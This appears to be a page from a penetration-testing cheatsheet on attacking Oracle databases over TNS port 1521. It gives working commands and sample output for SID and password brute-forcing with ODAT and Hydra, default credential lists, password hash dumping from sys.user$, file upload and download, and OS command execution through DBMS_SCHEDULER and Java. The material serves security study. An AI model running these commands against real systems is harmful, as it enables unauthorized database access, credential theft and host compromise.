@@ -1,0 +1,470 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Oracle TNS · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Network › Service Footprinting</nav><h1>Oracle TNS</h1><p class="cx-lede">Oracle Database footprinting - TNS Listener on port 1521, SID enumeration, default-credential testing, schema enum via sqlplus, hash extraction from sys.user$, and the ODAT tool chain.</p><div class="cx-tags"><span class="cx-tag">MITRE T1046, T1078, T1213</span><span class="cx-tag">D3FEND D3-NTA</span><span class="cx-tag">IMPACT RCE, DataExfil, CredentialTheft, FileRead, FileWrite</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Oracle Database uses the <strong>TNS (Transparent Network Substrate)</strong> protocol on TCP 1521 by default. Unlike MySQL/MSSQL, you connect to a <em>listener</em> on 1521 which then routes you to a specific <em>SID</em> (System Identifier) or <em>Service Name</em> - each representing a database instance. Recon goes in two stages: enumerate the listener, find valid SIDs, then test credentials per SID.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Service scan
+nmap -sV -sC -p1521 --script oracle-tns-version,oracle-sid-brute &lt;target&gt;
+
+# 2. SID brute-force (via ODAT)
+odat sidguesser -s &lt;target&gt; -p 1521
+
+# 3. Default-credential test against each found SID
+odat passwordguesser -s &lt;target&gt; -p 1521 -d &lt;SID&gt; --accounts-file accounts.txt
+
+# 4. Connect with valid creds
+sqlplus user/password@&lt;target&gt;:1521/&lt;SID&gt;
+
+# 5. Run SQL
+SQL&gt; select * from session_privs;
+SQL&gt; select username, password from sys.user$ where password is not null;</code></pre></figure>
+<p>Success indicator: ODAT returns one or more valid <code>SID:user/password</code> triples; <code>sqlplus</code> connects; <code>select user from dual</code> returns the authenticated username.</p>
+<h2 id="protocol-overview">Protocol overview</h2>
+<p>Oracle's networking stack is layered:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Client                                  Oracle Server
+  ↓                                       ↓
+TNS Listener (on 1521 by default)
+  ↓                                       ↓
+Specific database instance (SID / service)
+  ↓                                       ↓
+Schema (user account) within that instance</code></pre></figure>
+<p>The TNS Listener is the gatekeeper - it answers on 1521, accepts a connect packet that names a SID or Service Name, and either forwards the connection to that instance or returns an error.</p>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>TNS</strong></td>
+<td>Transparent Network Substrate - Oracle's network protocol</td>
+</tr>
+<tr>
+<td><strong>Listener</strong></td>
+<td>The daemon that accepts incoming connections on 1521</td>
+</tr>
+<tr>
+<td><strong>SID</strong> (System Identifier)</td>
+<td>Unique name for a database <em>instance</em> (a running Oracle process)</td>
+</tr>
+<tr>
+<td><strong>Service Name</strong></td>
+<td>Alias that can refer to one or more instances (used in RAC clusters)</td>
+</tr>
+<tr>
+<td><strong>Schema</strong></td>
+<td>A user account with its own owned objects (tables, views, procedures)</td>
+</tr>
+<tr>
+<td><strong>Privilege</strong></td>
+<td>Permission to perform operations (CREATE TABLE, SELECT, etc.)</td>
+</tr>
+<tr>
+<td><strong>Role</strong></td>
+<td>Bundle of privileges granted as a unit (<code>DBA</code>, <code>RESOURCE</code>, <code>CONNECT</code>)</td>
+</tr>
+</tbody>
+</table>
+<p>A connection string is <code>user/password@host:port/SID</code> or <code>user/password@host:port/service_name</code>.</p>
+<h3 id="default-sids-by-oracle-version">Default SIDs by Oracle version</h3>
+<p>Different versions ship with different default SIDs. Brute-force lists should cover common candidates:</p>
+<table>
+<thead>
+<tr>
+<th>Version / Edition</th>
+<th>Common default SIDs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Oracle 8 / 9i</td>
+<td><code>ORCL</code></td>
+</tr>
+<tr>
+<td>Oracle 10g / 11g (Enterprise)</td>
+<td><code>ORCL</code></td>
+</tr>
+<tr>
+<td>Oracle 11g XE (Express)</td>
+<td><code>XE</code></td>
+</tr>
+<tr>
+<td>Oracle 12c+</td>
+<td><code>ORCL</code>, <code>ORCLCDB</code> (container DB), <code>ORCLPDB1</code> (pluggable)</td>
+</tr>
+<tr>
+<td>Oracle Application Server</td>
+<td><code>OAS</code>, <code>IAS</code></td>
+</tr>
+<tr>
+<td>Oracle Database Cloud</td>
+<td><code>cdb1</code>, <code>&lt;custom&gt;</code></td>
+</tr>
+</tbody>
+</table>
+<p>The <a href="https://github.com/quentinhardy/odat/blob/master/sids.txt">list of well-known SIDs</a> bundled with ODAT covers the common cases plus thousands of installer-default and customer-encountered values.</p>
+<h3 id="default-oracle-accounts">Default Oracle accounts</h3>
+<p>Many default accounts ship with well-known passwords and weren't always locked in older versions:</p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Default password</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SYS</code></td>
+<td><code>CHANGE_ON_INSTALL</code>, <code>MANAGER</code></td>
+<td>DBA</td>
+</tr>
+<tr>
+<td><code>SYSTEM</code></td>
+<td><code>MANAGER</code></td>
+<td>DBA</td>
+</tr>
+<tr>
+<td><code>DBSNMP</code></td>
+<td><code>DBSNMP</code></td>
+<td>OEM monitoring</td>
+</tr>
+<tr>
+<td><code>OUTLN</code></td>
+<td><code>OUTLN</code></td>
+<td>Stored outlines</td>
+</tr>
+<tr>
+<td><code>MGMT_VIEW</code></td>
+<td><code>MGMT_VIEW</code></td>
+<td>OEM</td>
+</tr>
+<tr>
+<td><code>SCOTT</code></td>
+<td><code>TIGER</code></td>
+<td>Demo (legendary)</td>
+</tr>
+<tr>
+<td><code>HR</code></td>
+<td><code>HR</code></td>
+<td>Demo schema</td>
+</tr>
+<tr>
+<td><code>OE</code></td>
+<td><code>OE</code></td>
+<td>Order Entry demo schema</td>
+</tr>
+<tr>
+<td><code>XDB</code></td>
+<td><code>XDB</code>, <code>CHANGE_ON_INSTALL</code></td>
+<td>XML DB</td>
+</tr>
+<tr>
+<td><code>MDSYS</code></td>
+<td><code>MDSYS</code></td>
+<td>Spatial</td>
+</tr>
+<tr>
+<td><code>CTXSYS</code></td>
+<td><code>CTXSYS</code></td>
+<td>Text</td>
+</tr>
+</tbody>
+</table>
+<p>A comprehensive list lives in <a href="https://github.com/quentinhardy/odat/blob/master/accounts/accounts.txt">ODAT's accounts.txt</a> - about 600 username/password pairs covering Oracle defaults across versions and installed components.</p>
+<h2 id="default-configuration">Default configuration</h2>
+<p>The TNS Listener's config (<code>/u01/app/oracle/product/&lt;version&gt;/network/admin/listener.ora</code>) defines which SIDs the listener serves:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>LISTENER =
+  (DESCRIPTION_LIST =
+    (DESCRIPTION =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))
+      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+    )
+  )
+
+SID_LIST_LISTENER =
+  (SID_LIST =
+    (SID_DESC =
+      (SID_NAME = ORCL)
+      (ORACLE_HOME = /u01/app/oracle/product/19.0.0/dbhome_1)
+    )
+  )</code></pre></figure>
+<p>Modern Oracle versions (11g+) use <strong>dynamic service registration</strong> - instances register themselves with the listener at startup, and <code>SID_LIST_LISTENER</code> may be empty in the config file while the listener still serves multiple SIDs.</p>
+<p>The status command (<code>lsnrctl status</code>) shows registered services - when you have local access. Externally, you query the listener via TNS.</p>
+<h2 id="dangerous-settings">Dangerous settings</h2>
+<table>
+<thead>
+<tr>
+<th>Setting</th>
+<th>What it enables</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Listener exposed on <code>0.0.0.0:1521</code></td>
+<td>Public-internet reachable database listener</td>
+</tr>
+<tr>
+<td>No <code>LOCAL_OS_AUTHENTICATION_&lt;listener_name&gt; = OFF</code></td>
+<td>Allows <code>SET CURRENT_LISTENER ...</code> style commands (pre-11g vulnerability)</td>
+</tr>
+<tr>
+<td>Unlocked default accounts</td>
+<td><code>SYS/CHANGE_ON_INSTALL</code>, <code>SYSTEM/MANAGER</code>, <code>SCOTT/TIGER</code> and friends still active</td>
+</tr>
+<tr>
+<td><code>REMOTE_OS_AUTHENT = TRUE</code></td>
+<td>Trusts remote OS authentication - fairly easy to forge</td>
+</tr>
+<tr>
+<td><code>O7_DICTIONARY_ACCESSIBILITY = TRUE</code></td>
+<td>Backward-compat setting that exposes the data dictionary to non-DBA users</td>
+</tr>
+<tr>
+<td>Granted <code>PUBLIC</code> excessive privileges</td>
+<td>Anyone authenticated can do operations they shouldn't</td>
+</tr>
+<tr>
+<td><code>DBMS_LDAP</code> and friends not revoked from PUBLIC</td>
+<td>Anyone authenticated can make outbound LDAP/HTTP connections from the DB</td>
+</tr>
+<tr>
+<td><code>utl_file_dir = *</code> (deprecated but still seen)</td>
+<td>Old file-access setting - any path readable/writable by Oracle process</td>
+</tr>
+<tr>
+<td><code>CREATE ANY DIRECTORY</code> granted to non-DBAs</td>
+<td>File-system access via directory objects</td>
+</tr>
+</tbody>
+</table>
+<p>The combination of "exposed on the network" + "default accounts not locked" is the most common Oracle finding in practice. The combination of "credentialed access with DBA" + <code>dbms_xdb_config</code>, <code>utl_http</code>, or <code>utl_file</code> is the path from "I have credentials" to "I read/write arbitrary files on the host."</p>
+<h2 id="footprinting-commands">Footprinting commands</h2>
+<h3 id="service-scan-and-version-probe">Service scan and version probe</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sudo nmap -sV -sC -p1521 10.0.14.128</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>PORT     STATE SERVICE VERSION
+1521/tcp open  oracle-tns Oracle TNS Listener 11.2.0.2.0 (unauthorized)</code></pre></figure>
+<p>The version (<code>11.2.0.2.0</code>) is volunteered by the listener without authentication. Cross-reference for known CVEs.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sudo nmap -sV -p1521 --script &quot;oracle-tns-version,oracle-sid-brute&quot; 10.0.14.128</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>PORT     STATE SERVICE VERSION
+1521/tcp open  oracle-tns Oracle TNS Listener 11.2.0.2.0 (unauthorized)
+| oracle-sid-brute:
+|   ORCL
+|   XE
+|_  PLSExtProc</code></pre></figure>
+<p>NSE's <code>oracle-sid-brute</code> walks a built-in wordlist. It'll find common SIDs quickly.</p>
+<h3 id="sid-enumeration-with-odat">SID enumeration with ODAT</h3>
+<p><a href="https://github.com/quentinhardy/odat">ODAT</a> (Oracle Database Attacking Tool) is the operator's Swiss Army knife for Oracle. It needs Oracle Instant Client (and <code>cx_Oracle</code>) to reach the listener - on Debian/Kali:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sudo apt install libaio1 python3-dev alien -y
+# download Instant Client &quot;basic&quot; + &quot;sqlplus&quot; zips from Oracle, unzip them, then
+# point the loader AND PATH at the extracted dir, using the absolute path:
+IC=&quot;$PWD/instantclient_21_12&quot;
+export LD_LIBRARY_PATH=&quot;$IC:$LD_LIBRARY_PATH&quot;
+export PATH=&quot;$IC:$PATH&quot;                     # so the `sqlplus` binary resolves
+# system Python is externally managed (PEP 668) on Debian 12+/Kali - use a venv:
+python3 -m venv ~/.venvs/odat &amp;&amp; . ~/.venvs/odat/bin/activate
+pip install cx_Oracle</code></pre></figure>
+<p>With that in place:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">odat sidguesser -s 10.0.14.128 -p 1521</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[+] We found 2 SIDs
+[+] SIDs found:
+    - XE
+    - PLSExtProc</code></pre></figure>
+<p>The default wordlist contains thousands of SIDs. For a wider sweep, point <code>--sids-file</code> at a custom list.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># All-version brute (slower but comprehensive)
+odat all -s 10.0.14.128 -p 1521</code></pre></figure>
+<p><code>odat all</code> runs every applicable check - sidguesser, passwordguesser, listener exploits, version-specific vulnerabilities - in sequence.</p>
+<h3 id="password-brute-force-per-sid">Password brute-force per SID</h3>
+<p>Once you have SIDs, brute-force credentials against each:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">odat passwordguesser -s 10.0.14.128 -p 1521 -d XE \
+  --accounts-file accounts.txt</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[+] Valid credential : SYSTEM/manager
+[+] Valid credential : SCOTT/tiger</code></pre></figure>
+<p>The included <code>accounts.txt</code> covers the standard Oracle defaults. For environments where the admin set custom passwords, supplement with the engagement-specific password list - same approach as any other database brute-force.</p>
+<p>The Hydra option:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hydra -L users.txt -P passwords.txt oracle-listener://10.0.14.128 \
+  -s 1521 -F -t 4</code></pre></figure>
+<h3 id="connecting-with-sqlplus">Connecting with sqlplus</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlplus SYSTEM/manager@10.0.14.128:1521/XE</code></pre></figure>
+<p>If <code>sqlplus</code> isn't installed locally, use Oracle Instant Client (rpm/deb from Oracle) or <code>sqlcl</code> (Java-based, more portable). On Kali, <code>apt install oracle-sqldeveloper</code> provides a usable client.</p>
+<p>Connection options:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># As SYSDBA (full DBA, requires SYSDBA privilege grant)
+sqlplus SYS/manager@10.0.14.128:1521/XE as sysdba
+
+# As SYSOPER (operations role)
+sqlplus user/password@target/SID as sysoper
+
+# Service name instead of SID (separated by /)
+sqlplus user/password@//target:1521/service.name
+
+# Using TNS alias from tnsnames.ora
+sqlplus user/password@my_alias</code></pre></figure>
+<h3 id="database-enumeration">Database enumeration</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; show user;
+USER is &quot;SYSTEM&quot;
+
+-- All schemas / database users
+SQL&gt; select username from all_users;
+USERNAME
+-------------------
+SYS
+SYSTEM
+ANONYMOUS
+APEX_PUBLIC_USER
+CTXSYS
+HR
+MDSYS
+SCOTT
+XDB
+
+-- Tables you can access
+SQL&gt; select owner, table_name from all_tables where owner not in
+     (&#x27;SYS&#x27;,&#x27;SYSTEM&#x27;,&#x27;MDSYS&#x27;,&#x27;CTXSYS&#x27;,&#x27;XDB&#x27;,&#x27;APEX_040000&#x27;,&#x27;APEX_PUBLIC_USER&#x27;);
+
+-- Columns in a specific table
+SQL&gt; select column_name, data_type from all_tab_columns
+     where owner = &#x27;HR&#x27; and table_name = &#x27;EMPLOYEES&#x27;;
+
+-- Your effective privileges
+SQL&gt; select * from session_privs;
+SQL&gt; select * from user_role_privs;
+
+-- All system privileges granted (system-wide audit)
+SQL&gt; select grantee, privilege from dba_sys_privs where grantee = &#x27;SCOTT&#x27;;</code></pre></figure>
+<h3 id="password-hash-extraction">Password hash extraction</h3>
+<p>Oracle stores hashes in <code>SYS.USER$</code>:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; select name, password from sys.user$ where password is not null;
+NAME            PASSWORD
+--------------- ----------------
+SYS             5638228DAF52805F
+SYSTEM          D4DF7931AB130E37
+SCOTT           F894844C34402B67</code></pre></figure>
+<p>Older hashes (Oracle ≤10g) are the DES-based <code>password</code> column - crackable with <code>hashcat -m 3100</code>.</p>
+<p>Newer hashes (11g+) live in the <code>spare4</code> column with multiple formats:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; select name, spare4 from sys.user$ where spare4 is not null;
+NAME            SPARE4
+--------------- ----------------------------------------------------------
+SYSTEM          S:0E78EF&lt;...&gt;;H:F0E07&lt;...&gt;;T:5A1&lt;...&gt;</code></pre></figure>
+<ul>
+<li><code>S:</code> prefix - SHA-1 with salt, <code>hashcat -m 112</code></li>
+<li><code>H:</code> prefix - older MD5-based, <code>hashcat -m 3100</code>-related</li>
+<li><code>T:</code> prefix - Oracle 12c+ SHA-512 with PBKDF2, <code>hashcat -m 12300</code></li>
+</ul>
+<p>ODAT can dump these directly:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">odat passwordstealer -s 10.0.14.128 -d XE -U SYSTEM -P manager</code></pre></figure>
+<h3 id="file-readwrite-with-odat">File read/write with ODAT</h3>
+<p>When you have a <code>CREATE ANY DIRECTORY</code> privilege (DBA has it, many other roles have it too):</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Upload a file
+odat utlfile -s 10.0.14.128 -d XE -U SYSTEM -P manager \
+  --putFile C:/temp shell.exe /tmp/shell.exe
+
+# Download a file
+odat utlfile -s 10.0.14.128 -d XE -U SYSTEM -P manager \
+  --getFile C:/ boot.ini ./boot.ini
+
+# External-table read (works with lower privileges sometimes)
+odat externaltable -s 10.0.14.128 -d XE -U SYSTEM -P manager \
+  --getFile /etc passwd ./passwd</code></pre></figure>
+<p>The <code>dbms_advisor</code> module can also reach the file system in certain configurations.</p>
+<h3 id="rce-via-oracle">RCE via Oracle</h3>
+<p>Multiple paths exist depending on version and privileges:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Java payload (Oracle 11g+, requires javaPrivilegeGrants)
+odat java -s 10.0.14.128 -d XE -U SYSTEM -P manager \
+  --exec /tmp &#x27;id &gt; /tmp/out&#x27;
+
+# CTXSYS.DRILOAD (Oracle 10g vulnerability)
+odat ctxsys -s 10.0.14.128 -d XE -U SCOTT -P tiger
+
+# Scheduler (DBMS_SCHEDULER) to run OS commands
+odat dbmsscheduler -s 10.0.14.128 -d XE -U SYSTEM -P manager \
+  --exec &#x27;cmd.exe /c whoami &gt; C:\\temp\\out.txt&#x27;</code></pre></figure>
+<p>Each module has its own privilege requirements; <code>odat all</code> enumerates which modules will work given your current credentials.</p>
+<h2 id="common-chained-workflows">Common chained workflows</h2>
+<p><strong>Listener → SIDs → default creds → DBA → host RCE:</strong>
+1. <code>nmap</code> confirms listener on 1521
+2. <code>odat sidguesser</code> finds <code>XE</code>
+3. <code>odat passwordguesser</code> finds <code>SYSTEM/manager</code>
+4. ODAT confirms DBA role
+5. <code>odat externaltable</code> or <code>odat dbmsscheduler</code> for file read or RCE</p>
+<p><strong>App credentials in config → low-priv access → privilege escalation:</strong>
+1. Find Oracle creds in a web app config or filesystem
+2. Login as the application user (often with limited grants)
+3. Test for known Oracle CVE privilege escalation paths (<code>CREATE PROCEDURE</code>/<code>AUTHID DEFINER</code> abuse)
+4. Escalate to DBA, repeat the DBA workflow</p>
+<p><strong>File read → tnsnames.ora → discover other DBs:</strong>
+1. With file-read primitive, fetch <code>tnsnames.ora</code> from <code>$ORACLE_HOME/network/admin/</code>
+2. The file lists aliases for <em>all</em> databases the host knows about - internal DBs, replicas, dev/staging
+3. Add each newly-discovered TNS target to your scan list</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Service scan</td>
+<td><code>nmap -sV --script oracle-tns-version,oracle-sid-brute -p1521 &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>SID brute</td>
+<td><code>odat sidguesser -s &lt;target&gt; -p 1521</code></td>
+</tr>
+<tr>
+<td>Password brute</td>
+<td><code>odat passwordguesser -s &lt;target&gt; -p 1521 -d &lt;SID&gt; --accounts-file accounts.txt</code></td>
+</tr>
+<tr>
+<td>Run all checks</td>
+<td><code>odat all -s &lt;target&gt; -p 1521</code></td>
+</tr>
+<tr>
+<td>sqlplus connect</td>
+<td><code>sqlplus user/pass@&lt;target&gt;:1521/&lt;SID&gt;</code></td>
+</tr>
+<tr>
+<td>sqlplus as DBA</td>
+<td><code>sqlplus user/pass@&lt;target&gt;:1521/&lt;SID&gt; as sysdba</code></td>
+</tr>
+<tr>
+<td>Current user</td>
+<td><code>SELECT user FROM dual;</code></td>
+</tr>
+<tr>
+<td>List schemas</td>
+<td><code>SELECT username FROM all_users;</code></td>
+</tr>
+<tr>
+<td>List tables</td>
+<td><code>SELECT owner, table_name FROM all_tables;</code></td>
+</tr>
+<tr>
+<td>Current privileges</td>
+<td><code>SELECT * FROM session_privs;</code></td>
+</tr>
+<tr>
+<td>Dump hashes</td>
+<td><code>SELECT name, password, spare4 FROM sys.user$;</code></td>
+</tr>
+<tr>
+<td>File read</td>
+<td><code>odat utlfile ... --getFile &lt;dir&gt; &lt;file&gt; &lt;localpath&gt;</code></td>
+</tr>
+<tr>
+<td>File write</td>
+<td><code>odat utlfile ... --putFile &lt;localpath&gt; &lt;remotedir&gt; &lt;remotefile&gt;</code></td>
+</tr>
+<tr>
+<td>RCE via scheduler</td>
+<td><code>odat dbmsscheduler ... --exec '&lt;command&gt;'</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../mssql/index.html">Previous: MSSQL</a><a class="cx-next" href="../ipmi/index.html">Next: IPMI</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
